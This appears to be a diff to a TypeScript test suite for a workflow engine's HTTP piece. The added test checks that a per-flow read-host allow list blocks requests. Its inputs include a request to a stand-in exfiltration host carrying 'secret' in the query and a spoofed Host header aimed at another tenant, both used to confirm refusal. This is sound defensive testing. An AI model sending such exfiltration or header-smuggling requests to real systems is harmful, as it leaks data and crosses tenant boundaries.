@@ -13,7 +13,7 @@ import { createRequire } from 'node:module';
 import { resolve } from 'node:path';
 import { ENGINE_BUILD_PATHS } from './build';
 import { buildPiece } from './build-pieces';
-import { EGRESS_POLICY_ENV } from '../../runtime/http-egress';
+import { EGRESS_POLICY_ENV, withReadHosts } from '../../runtime/http-egress';
 
 const pieceDir = resolve(ENGINE_BUILD_PATHS.VENDOR_PACKAGES, 'pieces/core/http');
 const bundle = resolve(pieceDir, 'dist/src/index.js');
@@ -63,6 +63,21 @@ describe.skipIf(skip)('the compiled core HTTP piece', () => {
     failingLookup();
     await expect(run({ propsValue: props('GET') })).rejects.toBeDefined();
     expect(lookups).toEqual(['ops.invalid', 'ops.invalid', 'ops.invalid']);
+  });
+
+  test('#1153: a read run inside the engine\'s read list is held to it, though the piece bundle has its own copy of the guard', async () => {
+    // `withReadHosts` here is the source module, a different copy from the
+    // one compiled into the piece, as the engine bundle's is in production.
+    failingLookup();
+    await expect(withReadHosts(['listed.invalid'], () => run({ propsValue: props('GET', { url: 'http://exfil.invalid/c?d=secret' }) })))
+      .rejects.toThrow(/not on this flow's read list/);
+    expect(lookups).toEqual([]);
+    await expect(withReadHosts(['listed.invalid'], () => run({ propsValue: props('GET', { url: 'http://listed.invalid/x', headers: { Host: 'other-tenant.example' } }) })))
+      .rejects.toThrow(/may not set its own Host header/);
+    expect(lookups).toEqual([]);
+    // Listed, it goes on to the lookup (which fails here).
+    await expect(withReadHosts(['listed.invalid'], () => run({ propsValue: props('GET', { url: 'http://listed.invalid/x' }) }))).rejects.toBeDefined();
+    expect(lookups[0]).toBe('listed.invalid');
   });
 
   test('loopback and metadata are refused by name or literal, under either policy, and a refusal is not retried', async () => {
